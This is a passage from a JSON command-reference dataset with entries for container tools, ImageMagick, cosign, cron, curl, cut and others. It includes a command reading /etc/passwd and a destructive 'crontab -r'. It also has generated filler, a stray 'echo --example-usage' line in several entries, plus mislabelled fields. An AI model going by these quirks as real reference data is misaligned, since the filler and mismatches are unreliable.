        "explanation": "Scan image, sign it, retag for production registry, and push",
        "title": "trivy && cosign && docker && docker"
      },
      {
        "scenario": "Multi-registry synchronization",
        "commands": "skopeo sync --src docker --dest docker source-registry.com/myproject dest-registry.com/myproject --dest-creds user:pass && skopeo inspect docker://dest-registry.com/myproject/myapp:latest",
        "explanation": "Synchronize project images between registries and verify",
        "title": "skopeo && skopeo"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker-build",
        "relationship": "combo",
        "reason": "Build images before pushing to registries"
      },
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Deploy images from registries to Kubernetes"
      },
      {
        "name": "crane",
        "relationship": "alternative",
        "reason": "Google's tool for registry operations"
      }
    ],
    "warnings": [
      "Registry authentication tokens may expire and need renewal",
      "Multi-architecture builds require buildx or similar tools",
      "Image signing requires proper key management and distribution"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.docker.com/docker-hub/"
      },
      {
        "platform": "macos",
        "url": "https://docs.docker.com/docker-hub/"
      },
      {
        "platform": "windows",
        "url": "https://docs.docker.com/docker-hub/"
      },
      {
        "platform": "generic",
        "url": "https://distribution.github.io/distribution/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "container-security-scanning",
    "subtitle": "Container Security Scanning",
    "description": "Container image vulnerability scanning and security analysis",
    "examples": [
      "trivy image --severity HIGH,CRITICAL --format json --output report.json nginx:latest  # Scan Docker image for high and critical vulnerabilities in JSON format",
      "clair-scanner --ip $(hostname -I | cut -d' ' -f1) --threshold=High myapp:latest  # Scan image with Clair and fail on high-severity vulnerabilities",
      "anchore-cli image add myapp:latest && anchore-cli image wait myapp:latest && anchore-cli evaluate check myapp:latest  # Add image to Anchore, wait for analysis, and evaluate security policies",
      "hadolint Dockerfile --ignore DL3008 --ignore DL3009 --format json  # Lint Dockerfile for security best practices with specific rule exclusions",
      "opa eval -d security-policies/ -i deployment.yaml 'data.kubernetes.admission.deny[_]'  # Validate Kubernetes deployment against OPA security policies",
      "falco --config /etc/falco/falco.yaml --rules-file /etc/falco/rules.d/ -M 60  # Run Falco for runtime security monitoring with 60-second duration",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "dangerous",
    "syntaxPattern": "<scanner> <command> [options] <image>",
    "prerequisites": [
      "security-tools"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive security pipeline",
        "commands": "hadolint Dockerfile && trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:latest && docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy repo .",
        "explanation": "Lint Dockerfile, scan image for vulnerabilities, and scan source code",
        "title": "hadolint && trivy && docker"
      },
      {
        "scenario": "Policy-driven security validation",
        "commands": "opa fmt --diff security-policies/ && opa test security-policies/ && opa eval -d security-policies/ -i k8s-manifest.yaml 'data.kubernetes.admission.deny'",
        "explanation": "Format, test, and evaluate OPA security policies against manifests",
        "title": "opa && opa && opa"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker-build",
        "relationship": "combo",
        "reason": "Security scanning is part of the container build pipeline"
      },
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Deploy security-validated containers to Kubernetes"
      },
      {
        "name": "cosign",
        "relationship": "combo",
        "reason": "Sign and verify container images for supply chain security"
      }
    ],
    "warnings": [
      "Different scanners may report different vulnerabilities",
      "False positives require careful analysis and policy tuning",
      "Runtime security monitoring can impact performance"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://aquasecurity.github.io/trivy/"
      },
      {
        "platform": "macos",
        "url": "https://aquasecurity.github.io/trivy/"
      },
      {
        "platform": "windows",
        "url": "https://aquasecurity.github.io/trivy/"
      },
      {
        "platform": "generic",
        "url": "https://owasp.org/www-project-container-security-verification-standard/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "containerd",
    "subtitle": "container daemon",
    "description": "Industry-standard container runtime",
    "examples": [
      "ctr images list  # Show all container images managed by containerd",
      "ctr image pull docker.io/library/nginx:latest  # Download nginx image from Docker Hub",
      "ctr run --rm -t docker.io/library/ubuntu:latest mycontainer  # Start Ubuntu container with terminal",
      "ctr containers list  # Show all containers managed by containerd",
      "ctr images export nginx.tar docker.io/library/nginx:latest  # Export container image to tar file",
      "ctr images import nginx.tar  # Import container image from tar file",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "ctr [global-options] <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Image management workflow",
        "commands": "ctr image pull alpine:latest && ctr images list | grep alpine",
        "explanation": "Pull image and verify it's available",
        "title": "ctr && ctr | grep"
      },
      {
        "scenario": "Container lifecycle",
        "commands": "ctr run -d alpine:latest myapp sleep 3600 && ctr containers list",
        "explanation": "Start container in background and list running containers",
        "title": "ctr && ctr"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker",
        "relationship": "alternative",
        "reason": "Docker uses containerd as runtime engine"
      },
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Kubernetes uses containerd as container runtime"
      },
      {
        "name": "runc",
        "relationship": "combo",
        "reason": "Low-level runtime that containerd uses"
      }
    ],
    "warnings": [
      "Lower-level tool, less user-friendly than Docker",
      "Requires understanding of OCI specifications",
      "Different namespaces for different use cases"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://containerd.io/docs/"
      },
      {
        "platform": "macos",
        "url": "https://containerd.io/docs/"
      },
      {
        "platform": "windows",
        "url": "https://containerd.io/docs/"
      },
      {
        "platform": "generic",
        "url": "https://github.com/containerd/containerd/blob/main/docs/cri/crictl.md"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "convert",
    "subtitle": "ImageMagick convert",
    "description": "Convert and modify images using ImageMagick",
    "examples": [
      "convert image.png image.jpg  # Convert PNG image to JPEG format",
      "convert image.jpg -resize 800x600 resized.jpg  # Resize image to 800x600 pixels",
      "convert image.jpg -thumbnail 150x150 thumb.jpg  # Create 150x150 pixel thumbnail",
      "convert image.jpg -rotate 90 rotated.jpg  # Rotate image 90 degrees clockwise",
      "convert image.jpg -pointsize 30 -fill white -annotate +10+40 'Hello' output.jpg  # Add white text overlay at position 10,40",
      "convert image.jpg -blur 0x8 blurred.jpg  # Apply gaussian blur with radius 8",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "convert [options] input output",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Batch resize images",
        "commands": "mkdir thumbnails && for img in *.jpg; do convert \"$img\" -resize 200x200 \"thumbnails/$img\"; done",
        "explanation": "Create thumbnails of all JPEG images in thumbnails folder",
        "title": "mkdir && for ; do ; done"
      },
      {
        "scenario": "Create image montage",
        "commands": "convert *.jpg -resize 300x300^ -gravity center -extent 300x300 +append collage.jpg",
        "explanation": "Create horizontal collage from multiple images",
        "title": "convert"
      }
    ],
    "relatedCommands": [
      {
        "name": "identify",
        "relationship": "combo",
        "reason": "Get image information before processing with convert"
      },
      {
        "name": "mogrify",
        "relationship": "similar",
        "reason": "Modify images in-place instead of creating new files"
      },
      {
        "name": "ffmpeg",
        "relationship": "similar",
        "reason": "ffmpeg for video, ImageMagick for images"
      }
    ],
    "warnings": [
      "Can consume large amounts of memory with big images",
      "Security policy may restrict operations in some environments",
      "Quality loss when converting between lossy formats"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://imagemagick.org/script/convert.php"
      },
      {
        "platform": "macos",
        "url": "https://imagemagick.org/script/convert.php"
      },
      {
        "platform": "windows",
        "url": "https://imagemagick.org/script/convert.php"
      },
      {
        "platform": "generic",
        "url": "https://imagemagick.org/script/command-line-tools.php"
      }
    ],
    "distroNotes": {
      "linux": "Install imagemagick package",
      "macos": "Install via Homebrew: brew install imagemagick",
      "windows": "Download ImageMagick installer"
    }
  },
  {
    "name": "cosign",
    "subtitle": "Container Signing",
    "description": "Container signing and verification tool for supply chain security",
    "examples": [
      "cosign generate-key-pair  # Create private/public key pair for signing containers",
      "cosign sign --key cosign.key myregistry/myapp:v1.0.0  # Sign container image with private key",
      "cosign verify --key cosign.pub myregistry/myapp:v1.0.0  # Verify container image signature with public key",
      "cosign sign myregistry/myapp:v1.0.0  # Sign image using OIDC identity (keyless signing)",
      "cosign verify --certificate-identity user@company.com --certificate-oidc-issuer https://accounts.google.com myregistry/myapp:v1.0.0  # Verify keyless signature with identity verification",
      "cosign attest --predicate attestation.json --key cosign.key myregistry/myapp:v1.0.0  # Attach SLSA attestation to container image",
      "cosign verify-attestation --key cosign.pub --type slsaprovenance myregistry/myapp:v1.0.0  # Verify SLSA provenance attestation on image",
      "cosign sign --key cosign.key --annotations env=production,team=backend myregistry/myapp:v1.0.0  # Sign image with additional metadata annotations",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "cosign [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete signing workflow",
        "commands": "cosign generate-key-pair && cosign sign --key cosign.key myregistry/myapp:v1.0.0 && cosign verify --key cosign.pub myregistry/myapp:v1.0.0",
        "explanation": "Generate keys, sign image, and verify signature",
        "title": "cosign && cosign && cosign"
      },
      {
        "scenario": "CI/CD integration",
        "commands": "docker build -t myregistry/myapp:$BUILD_ID . && docker push myregistry/myapp:$BUILD_ID && cosign sign --key cosign.key myregistry/myapp:$BUILD_ID",
        "explanation": "Build, push, and sign container image in CI pipeline",
        "title": "docker && docker && cosign"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "Cosign signs Docker/OCI container images"
      },
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Kubernetes can verify signed images with admission controllers"
      }
    ],
    "warnings": [
      "Private keys must be kept secure and backed up",
      "Keyless signing requires OIDC provider configuration",
      "Registry must support OCI artifact storage for signatures",
      "Attestations and signatures stored as separate artifacts"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.sigstore.dev/cosign/overview"
      },
      {
        "platform": "macos",
        "url": "https://docs.sigstore.dev/cosign/overview"
      },
      {
        "platform": "windows",
        "url": "https://docs.sigstore.dev/cosign/overview"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "cowsay",
    "subtitle": "Cow Say",
    "description": "Generate ASCII art of cow saying text",
    "examples": [
      "cowsay 'Hello World'  # Make cow say 'Hello World'",
      "cowsay -f dragon 'Roar!'  # Use dragon character instead of cow",
      "cowsay -l  # Show all available character files",
      "cowthink 'What to do today?'  # Make cow think instead of say",
      "echo 'Multiple lines\nof text' | cowsay  # Make cow say multi-line input",
      "cowsay -f tux 'Linux rocks!'  # Use Tux penguin character",
      "ls -la | cowsay -n  # Pipe command output to cowsay without word wrap"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "cowsay [options] [text]",
    "prerequisites": [
      "basic"
    ],
    "commandCombinations": [
      {
        "scenario": "Fortune cow",
        "commands": "fortune | cowsay",
        "explanation": "Combine fortune with cowsay for entertaining quotes",
        "title": "fortune | cowsay"
      }
    ],
    "relatedCommands": [
      {
        "name": "fortune",
        "relationship": "combo",
        "reason": "Often combined to create fortune-telling cow"
      },
      {
        "name": "figlet",
        "relationship": "similar",
        "reason": "Both create ASCII art text displays"
      }
    ],
    "warnings": [
      "Purely for entertainment and fun",
      "Many different character files available",
      "Popular in Unix culture and system administration"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man6/cowsay.6.html"
      },
      {
        "platform": "macos",
        "url": "Install via homebrew: brew install cowsay"
      },
      {
        "platform": "windows",
        "url": "Available via WSL or PowerShell modules"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "cp",
    "subtitle": "copy",
    "description": "Copy files and directories",
    "examples": [
      "cp config.json config.json.backup  # Make backup copy before editing configuration",
      "cp -r project/ project-backup/  # Recursively copy directory and all contents",
      "cp -p script.sh /usr/local/bin/  # Maintain original file permissions and timestamps",
      "cp -i *.txt backup/  # Prompt before overwriting existing files",
      "cp -f source.log dest.log  # Overwrite destination without prompting",
      "cp -a /var/www/html/ /backup/website/  # Archive copy preserving all attributes",
      "cp --sparse=always large_file.img compressed.img  # Copy sparse file efficiently"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "caution",
    "syntaxPattern": "cp [options] <source> <destination>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup and timestamp files",
        "commands": "cp important.txt important-$(date +%Y%m%d).txt",
        "explanation": "Create backup with current date in filename",
        "title": "cp"
      },
      {
        "scenario": "Copy only newer files",
        "commands": "cp -u source/* destination/",
        "explanation": "Update destination only with newer source files",
        "title": "cp"
      }
    ],
    "relatedCommands": [
      {
        "name": "mv",
        "relationship": "similar",
        "reason": "Use mv to move/rename instead of copy"
      },
      {
        "name": "rsync",
        "relationship": "powerful",
        "reason": "More advanced copying with network support and sync options"
      },
      {
        "name": "scp",
        "relationship": "similar",
        "reason": "Copy files between different machines over SSH"
      }
    ],
    "warnings": [
      "cp overwrites files without warning by default",
      "Need -r flag to copy directories",
      "Permissions may change unless using -p flag"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/cp.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/cp.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "cpio",
    "subtitle": "Copy Input/Output",
    "description": "Copy files to and from archives",
    "examples": [
      "find . -name '*.txt' | cpio -ov > files.cpio  # Create cpio archive from find results",
      "cpio -iv < files.cpio  # Extract files from cpio archive",
      "cpio -tv < files.cpio  # List files in cpio archive",
      "find source/ | cpio -pdm target/  # Copy directory tree preserving structure",
      "find /etc -type f | cpio -oc | gzip > etc_backup.cpio.gz  # Create compressed system config backup",
      "rpm2cpio package.rpm | cpio -idmv  # Extract files from RPM package",
      "ls | cpio -oH newc > archive.cpio  # Create cpio archive in newc format"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "cpio [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System backup",
        "commands": "find / -depth | cpio -ov | gzip > system_backup.cpio.gz",
        "explanation": "Create compressed system backup with cpio",
        "title": "find | cpio | gzip > system_backup"
      }
    ],
    "relatedCommands": [
      {
        "name": "tar",
        "relationship": "alternative",
        "reason": "tar is more commonly used for archiving"
      }
    ],
    "warnings": [
      "Uses stdin/stdout for file lists and archives",
      "Different syntax compared to tar"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/cpio/manual/cpio.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/cpio.html"
      },
      {
        "platform": "windows",
        "url": "https://www.gnu.org/software/cpio/manual/cpio.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "cqlsh",
    "subtitle": "Cassandra Query Language Shell",
    "description": "Apache Cassandra interactive command-line interface",
    "examples": [
      "cqlsh  # Connect to Cassandra on localhost:9042",
      "cqlsh cassandra.example.com 9042  # Connect to Cassandra on remote host",
      "cqlsh -f schema.cql  # Execute CQL commands from file",
      "cqlsh -e 'DESCRIBE keyspaces;'  # Run single CQL command and exit",
      "cqlsh -u username -p password cassandra.example.com  # Connect with username and password",
      "cqlsh --debug  # Connect with detailed debug output",
      "cqlsh --request-timeout=30  # Set 30-second timeout for requests"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "data-processing",
    "safety": "safe",
    "syntaxPattern": "cqlsh [options] [host] [port]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Database exploration workflow",
        "commands": "cqlsh -e 'DESCRIBE keyspaces;' && cqlsh -e 'DESCRIBE tables;' && cqlsh -e 'SELECT * FROM system.local;'",
        "explanation": "List keyspaces, tables, and show local node info",
        "title": "cqlsh ; && cqlsh ; && cqlsh ;"
      }
    ],
    "relatedCommands": [
      {
        "name": "nodetool",
        "relationship": "combo",
        "reason": "Cassandra cluster management tool"
      },
      {
        "name": "cassandra-stress",
        "relationship": "combo",
        "reason": "Cassandra performance testing tool"
      }
    ],
    "warnings": [
      "CQL syntax differs from standard SQL in many ways",
      "Requires Python 2.7 or 3.x depending on version",
      "Connection may timeout on slow networks"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://cassandra.apache.org/doc/latest/cassandra/tools/cqlsh.html"
      },
      {
        "platform": "macos",
        "url": "https://cassandra.apache.org/doc/latest/cassandra/tools/cqlsh.html"
      },
      {
        "platform": "windows",
        "url": "https://cassandra.apache.org/doc/latest/cassandra/tools/cqlsh.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "create-react-app",
    "subtitle": "Create React App",
    "description": "Create React App tool for bootstrapping React applications",
    "examples": [
      "npx create-react-app my-app  # Create new React application with default configuration",
      "npx create-react-app my-app --template typescript  # Create React app with TypeScript support",
      "npm start  # Start development server with hot reloading",
      "npm run build  # Create optimized production build",
      "npm test  # Run test suite in watch mode",
      "npm run eject  # Expose webpack configuration (irreversible)",
      "npx create-react-app@latest my-app --template cra-template-pwa  # Create PWA-enabled React app"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "npx create-react-app <app-name> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create and start app",
        "commands": "npx create-react-app my-app && cd my-app && npm start",
        "explanation": "Create React app and immediately start development server",
        "title": "npx && cd && npm"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "combo",
        "reason": "CRA uses npm for package management and scripts"
      },
      {
        "name": "vite",
        "relationship": "alternative",
        "reason": "Vite provides faster alternative for React development"
      }
    ],
    "warnings": [
      "Ejecting is irreversible and exposes complex configuration",
      "Limited customization without ejecting or using CRACO",
      "Bundle size can be large without optimization"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://create-react-app.dev/docs/getting-started"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "crictl",
    "subtitle": "CRI control",
    "description": "CLI for CRI-compatible container runtimes (Kubernetes)",
    "examples": [
      "crictl pods  # Show all pods on Kubernetes node",
      "crictl ps  # Display running containers",
      "crictl logs container-id  # Show logs for specific container",
      "crictl exec -it container-id /bin/bash  # Open interactive shell in container",
      "crictl inspect container-id  # Show detailed container information",
      "crictl pull nginx:latest  # Download image to local container runtime",
      "crictl stats  # Display live resource usage statistics for containers"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "crictl [global-options] <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Debug Kubernetes pod",
        "commands": "crictl pods | grep failing && crictl ps | grep failing && crictl logs container-id",
        "explanation": "Find failing pod, identify container, view logs",
        "title": "crictl | grep && crictl | grep && crictl"
      },
      {
        "scenario": "Node maintenance",
        "commands": "crictl images | grep '<none>' && crictl rmi $(crictl images -q --filter dangling=true)",
        "explanation": "Find and remove dangling images",
        "title": "crictl | grep < none > && crictl"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "similar",
        "reason": "kubectl manages Kubernetes, crictl manages container runtime"
      },
      {
        "name": "docker",
        "relationship": "similar",
        "reason": "Similar commands but for CRI runtime instead of Docker"
      },
      {
        "name": "podman",
        "relationship": "similar",
        "reason": "Different container runtime tools"
      }
    ],
    "warnings": [
      "Primarily for Kubernetes node debugging",
      "Requires CRI-compatible runtime (containerd, CRI-O)",
      "Lower-level than kubectl commands"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://kubernetes.io/docs/tasks/debug-application-cluster/crictl/"
      },
      {
        "platform": "generic",
        "url": "https://github.com/kubernetes-sigs/cri-tools/blob/master/docs/crictl.md"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "cron",
    "subtitle": "Chronos",
    "description": "Time-based job scheduler for Unix-like systems",
    "examples": [
      "crontab -e  # Open editor to modify user's cron jobs",
      "crontab -l  # Display current user's cron jobs",
      "crontab -r  # Delete all cron jobs for current user",
      "0 2 * * * /home/user/backup.sh  # Run backup script every day at 2:00 AM",
      "0 * * * * /usr/sbin/logrotate /etc/logrotate.conf  # Run log rotation every hour",
      "0 3 * * 0 /usr/bin/apt update && /usr/bin/apt upgrade -y  # Update system packages every Sunday at 3:00 AM",
      "*/15 * * * * /usr/bin/curl -f http://localhost:8080/health || echo 'Service down' | mail -s 'Alert' admin@example.com  # Monitor service every 15 minutes",
      "crontab -e  # Edit crontab schedule for automated tasks"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "automation",
    "safety": "safe",
    "syntaxPattern": "crontab [options] or cron job syntax: min hour day month weekday command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Setup automated maintenance",
        "commands": "crontab -l > cron_backup.txt && echo '0 1 * * * /home/user/cleanup.sh' | crontab -",
        "explanation": "Backup current crontab then add new maintenance job",
        "title": "crontab > cron_backup && echo | crontab"
      }
    ],
    "relatedCommands": [
      {
        "name": "at",
        "relationship": "complementary",
        "reason": "at schedules one-time jobs, cron schedules recurring jobs"
      },
      {
        "name": "systemctl",
        "relationship": "modern-alternative",
        "reason": "systemd timers provide modern scheduling on systemd systems"
      }
    ],
    "warnings": [
      "Cron jobs run with minimal environment variables",
      "Use full paths to commands and files",
      "Output is typically emailed to the user unless redirected"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man5/crontab.5.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/crontab.html"
      },
      {
        "platform": "windows",
        "url": "Not available (use Task Scheduler)"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "crontab",
    "subtitle": "Cron Table",
    "description": "Edit and manage user cron jobs for scheduled tasks",
    "examples": [
      "crontab -e  # Open user's cron table for editing",
      "crontab -l  # Display current user's cron jobs",
      "crontab -r  # Delete all cron jobs for current user",
      "sudo crontab -u username -e  # Edit cron jobs for specific user (requires root)",
      "crontab ~/my_cron_jobs  # Replace current crontab with file contents",
      "echo '0 */6 * * * /home/user/sync.sh' | crontab -  # Add cron job from command line",
      "crontab -l | grep -v '#' | sort  # List active cron jobs sorted without comments",
      "crontab -l | wc -l && echo 'jobs configured'  # Count and display number of cron jobs"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "automation",
    "safety": "caution",
    "syntaxPattern": "crontab [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Cron job backup and restore",
        "commands": "crontab -l > ~/cron_backup.txt && crontab ~/new_cron_jobs && crontab -l",
        "explanation": "Backup current crontab, install new one, verify",
        "title": "crontab > && crontab && crontab"
      }
    ],
    "relatedCommands": [
      {
        "name": "at",
        "relationship": "similar",
        "reason": "Schedule one-time tasks"
      },
      {
        "name": "systemctl",
        "relationship": "alternative",
        "reason": "systemd timers as modern alternative"
      }
    ],
    "warnings": [
      "Environment variables may differ from shell",
      "Use absolute paths in cron jobs"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/crontab.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "csvkit",
    "subtitle": "CSV toolkit",
    "description": "Suite of command-line tools for working with CSV files",
    "examples": [
      "csvstat data.csv  # Show summary statistics for all columns in CSV",
      "csvsql --query 'SELECT name, age FROM data WHERE age > 25' data.csv  # Use SQL to filter and query CSV data",
      "in2csv data.xlsx > data.csv  # Convert Excel file to CSV format",
      "csvlook data.csv  # Display CSV in formatted table view",
      "csvcut -c name,email data.csv  # Extract only name and email columns",
      "csvgrep -c name -m 'John' data.csv  # Find all rows where name column contains 'John'",
      "csvjoin -c id customer_data.csv order_data.csv  # Join two CSV files on ID column",
      "csvstat data.csv && csvlook data.csv | head -10  # Show data statistics and preview"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "data-processing",
    "safety": "safe",
    "syntaxPattern": "csvtool [options] file.csv",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Process and analyze CSV data",
        "commands": "csvclean data.csv && csvstat data_out.csv && csvlook data_out.csv | head -20",
        "explanation": "Clean CSV, show statistics, then preview first 20 rows",
        "title": "csvclean && csvstat && csvlook | head"
      },
      {
        "scenario": "Convert and query Excel data",
        "commands": "in2csv data.xlsx | csvsql --query 'SELECT * FROM stdin WHERE sales > 1000'",
        "explanation": "Convert Excel to CSV and query high-value sales",
        "title": "in2csv | csvsql > 1000"
      }
    ],
    "relatedCommands": [
      {
        "name": "awk",
        "relationship": "alternative",
        "reason": "awk can process CSV but csvkit is more specialized"
      },
      {
        "name": "sqlite3",
        "relationship": "combo",
        "reason": "csvkit can import CSV to SQLite for complex queries"
      },
      {
        "name": "pandas",
        "relationship": "similar",
        "reason": "Python pandas library for data processing"
      }
    ],
    "warnings": [
      "Requires Python and pip installation",
      "Large CSV files can consume significant memory",
      "CSV dialect detection may fail with unusual formats"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://csvkit.readthedocs.io/"
      },
      {
        "platform": "macos",
        "url": "https://csvkit.readthedocs.io/"
      },
      {
        "platform": "windows",
        "url": "https://csvkit.readthedocs.io/"
      },
      {
        "platform": "generic",
        "url": "https://csvkit.readthedocs.io/en/latest/tutorial.html"
      }
    ],
    "distroNotes": {
      "linux": "Install via pip: pip install csvkit",
      "macos": "Install via pip: pip install csvkit",
      "windows": "Install via pip: pip install csvkit"
    }
  },
  {
    "name": "curl",
    "subtitle": "client URL",
    "description": "Transfer data to/from servers using various protocols",
    "examples": [
      "curl -O https://example.com/file.zip  # Download file and save with original filename",
      "curl https://api.example.com/users  # Fetch data from REST API endpoint",
      "curl -X POST -H 'Content-Type: application/json' -d '{\"name\":\"John\"}' https://api.example.com/users  # Send JSON payload to API endpoint",
      "curl -L https://short.url/redirect  # Follow HTTP redirects to final destination",
      "curl -I https://example.com  # Show HTTP headers without downloading body",
      "curl -H 'Authorization: Bearer token123' https://api.example.com/protected  # Include authentication header in request",
      "curl -X PUT -T upload.txt ftp://user:pass@ftp.example.com/  # Upload file via FTP protocol",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "curl [options] <URL>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Monitor API response time",
        "commands": "curl -w '%{time_total}\\n' -o /dev/null -s https://api.example.com",
        "explanation": "Measure total time for API request",
        "title": "curl"
      },
      {
        "scenario": "Download and pipe to processing",
        "commands": "curl -s https://api.example.com/data.json | jq '.'",
        "explanation": "Fetch JSON data and format it with jq",
        "title": "curl | jq"
      }
    ],
    "relatedCommands": [
      {
        "name": "wget",
        "relationship": "alternative",
        "reason": "Alternative tool for downloading files"
      },
      {
        "name": "httpie",
        "relationship": "alternative",
        "reason": "More user-friendly HTTP client"
      },
      {
        "name": "jq",
        "relationship": "combo",
        "reason": "Process JSON responses from curl"
      }
    ],
    "warnings": [
      "curl doesn't follow redirects by default (use -L)",
      "Large downloads may timeout without progress indicator",
      "SSL certificate errors can be bypassed with -k (insecure)"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/curl.1.html"
      },
      {
        "platform": "macos",
        "url": "https://curl.se/docs/manpage.html"
      },
      {
        "platform": "windows",
        "url": "https://curl.se/docs/manpage.html"
      },
      {
        "platform": "generic",
        "url": "https://curl.se/docs/"
      }
    ],
    "distroNotes": {
      "linux": "Pre-installed on most distributions",
      "windows": "Available in Windows 10+ or via package managers",
      "macos": "Pre-installed"
    }
  },
  {
    "name": "cut",
    "subtitle": "cut",
    "description": "Extract specific columns or fields from text",
    "examples": [
      "cut -c 1-10 file.txt  # Extract characters 1 through 10 from each line",
      "cut -d ',' -f 1,3 data.csv  # Extract 1st and 3rd fields from comma-separated file",
      "cut -d ':' -f 1 /etc/passwd  # Extract first field (username) from colon-delimited file",
      "echo 'document.pdf' | cut -d '.' -f 2  # Get file extension by splitting on dot",
      "cut -c 1-5,10-15 file.txt  # Extract characters 1-5 and 10-15 from each line",
      "ps aux | cut -c 1-20,40-60  # Extract specific columns from process list",
      "cut -d' ' -f1 access.log | sort | uniq -c | sort -nr  # Extract and count unique IP addresses from log",
      "cut -d' ' -f1 access.log | sort | uniq -c  # Extract first field and count occurrences"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "cut [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Process log files for specific data",
        "commands": "grep ERROR app.log | cut -d ' ' -f 1,4- | head -10",
        "explanation": "Extract timestamp and error message from log entries",
        "title": "grep | cut | head"
      },
      {
        "scenario": "Extract and sort unique values",
        "commands": "cut -d ',' -f 3 data.csv | sort | uniq -c",
        "explanation": "Get frequency count of values in 3rd column",
